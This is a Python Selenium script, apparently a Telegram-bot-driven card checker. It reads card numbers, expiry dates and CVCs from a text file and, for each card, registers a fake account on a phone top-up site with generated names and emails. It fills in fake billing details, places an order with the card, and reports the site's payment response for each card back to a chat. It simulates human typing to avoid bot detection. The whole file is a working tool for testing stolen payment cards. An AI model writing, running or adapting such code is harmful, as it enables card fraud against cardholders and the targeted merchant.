import names
import random
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

# PAYMENT UTILITIES ##################
# Funcion para calcular el YYYY segun el XPATH
def yyyy_convert(yyyy):
    if 2025 <= yyyy <= 2045:
        return yyyy - 2023
    else:
        raise ValueError("El año debe estar entre 2025 y 2045")


messages = []


def chk(chat_id, bot):
    with open("tarjetas.txt", "r") as file:
        tarjetas = file.readlines()
        total_cards = len(tarjetas)
        msg = bot.send_message(chat_id, "Ha iniciado la verificación. Esto puede tardar unos minutos.")
        message_id = msg.message_id
        for index, line in enumerate(tarjetas):
            # Separar los valores por coma
            ccn, mm, yyyy, cvc = line.strip().split('|')
            yyyy = yyyy_convert(int(yyyy))
            CARD_FORMAT = f"{ccn}|{mm}|{yyyy}|{cvc}"

            # FAKE DATA ###############
            nombre = names.get_first_name()
            apellido = names.get_last_name()
            email = f"{nombre.lower()}.{apellido.lower()}{random.randint(1, 999)}@gmail.com"

            def human_typing(element, text, delay=0.1):
                """Simula la escritura humana con un pequeño retraso entre caracteres."""
                for char in text:
                    element.send_keys(char)
                    time.sleep(delay)

            def wait_and_click(driver, by, value):
                """Espera hasta que un elemento sea clickeable, hace scroll y luego lo hace clic."""
                element = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((by, value)))
                driver.execute_script(
                    "arguments[0].scrollIntoView({block: 'center'});", element)
                element.click()

            def wait_and_send_keys(driver, by, value, text, delay=0.1):
                """Espera hasta que un elemento sea visible, hace scroll y envía texto."""
                element = WebDriverWait(driver, 15).until(
                    EC.visibility_of_element_located((by, value)))
                driver.execute_script(
                    "arguments[0].scrollIntoView({block: 'center'});", element)
                human_typing(element, text, delay)

            # Configuración del navegador
            options = Options()
            options.add_argument("--headless")  # Ejecutar sin interfaz gráfica
            options.add_argument("--disable-gpu")  # Desactivar la GPU, para evitar errores en algunos entornos
            options.add_argument("--no-sandbox")  # Para evitar problemas en entornos sin entorno gráfico
            driver = webdriver.Edge(options=options)
            driver.get("https://hablacuba.com/account/register")

            # Completar formulario de registro
            wait_and_send_keys(driver, By.ID, "first_name", nombre, delay=0.2)
            wait_and_send_keys(driver, By.ID, "last_name", apellido, delay=0.2)
            wait_and_send_keys(driver, By.ID, "login", email, delay=0.2)
            wait_and_send_keys(driver,
                               By.NAME,
                               "password",
                               "&802r4rL",
                               delay=0.2)
            wait_and_send_keys(driver,
                               By.NAME,
                               "confirm_password",
                               "&802r4rL",
                               delay=0.2)

            wait_and_click(driver, By.CSS_SELECTOR, ".custom-control > .w-100")
            wait_and_click(driver, By.CSS_SELECTOR, ".pt-20 > .btn")

            # Navegar a la sección de recarga
            wait_and_click(driver, By.XPATH, "//div[2]/div/div/a")
            wait_and_click(
                driver, By.XPATH,
                "/html/body/main/div[3]/div[1]/div/div[2]/div/form/div[3]/div[3]/div/div[1]/div[1]/div/img"
            )
            wait_and_click(
                driver, By.XPATH,
                "/html/body/main/div[3]/div[1]/div/div[2]/div/form/div[3]/div[3]/div/div[2]/div[1]/button/div[2]/img"
            )

            # Completar detalles de recarga
            wait_and_send_keys(driver,
                               By.NAME,
                               "account_fields[][Phone Number]",
                               "54143977",
                               delay=0.2)
            wait_and_click(
                driver, By.XPATH,
                "/html/body/main/div[3]/div[1]/div/div[2]/div/form/div[5]/div/div[3]/div[1]/button"
            )
            wait_and_click(driver, By.ID, "buy-button-mr")

            # Completar detalles de facturación
            wait_and_send_keys(driver,
                               By.NAME,
                               "bill[phone]",
                               "3052649636",
                               delay=0.2)
            wait_and_send_keys(driver,
                               By.NAME,
                               "bill[address]",
                               "street 2",
                               delay=0.2)
            wait_and_send_keys(driver,
                               By.NAME,
                               "bill[city]",
                               "New York",
                               delay=0.2)
            wait_and_send_keys(driver,
                               By.NAME,
                               "bill[zip]",
                               "10080",
                               delay=0.2)

            # Seleccionar opciones desplegables
            wait_and_click(
                driver, By.XPATH,
                "//select[@name='bill[country]']//option[.='United States']")
            wait_and_click(
                driver, By.XPATH,
                "/html/body/main/div[2]/div/div/div[2]/div/form/div[3]/div[1]/div/div/div[6]/div[2]/select/option[37]"
            )

            # Completar detalles de la tarjeta
            wait_and_send_keys(driver, By.ID, "card_number", ccn, delay=0.2)
            wait_and_click(driver, By.XPATH,
                           f"//select[@id='card_month']//option[.={mm}]")
            wait_and_click(
                driver, By.XPATH,
                f"/html/body/main/div[2]/div/div/div[2]/div/form/div[3]/div[2]/div/div/div[1]/div[3]/div[2]/select/option[{yyyy}]"
            )
            wait_and_send_keys(driver, By.ID, "card_cvv", cvc, delay=0.2)

            # Realizar pedido
            wait_and_click(driver, By.ID, "place_order_button")
            time.sleep(10)
            # Extraer respuesta
            wait = WebDriverWait(driver, 10)  # Espera hasta 10 segundos

            # Usar XPath para localizar el texto dentro del contenedor
            xpath_expression = "/html/body/main/div[2]/div/div/div[1]/div/div"
            element = wait.until(
                EC.presence_of_element_located((By.XPATH, xpath_expression)))

            # Extraer el texto del elemento encontrado
            message = element.text

            # Mostrar el texto extraído
            if message.strip():  # Verificar si hay texto
                messages.append(f"{CARD_FORMAT} -> {message}")
            else:
                print("No se encontró ningún mensaje en el contenedor.")
            time.sleep(2)
            driver.quit()

        for msg in messages:
            bot.send_message(chat_id, msg)
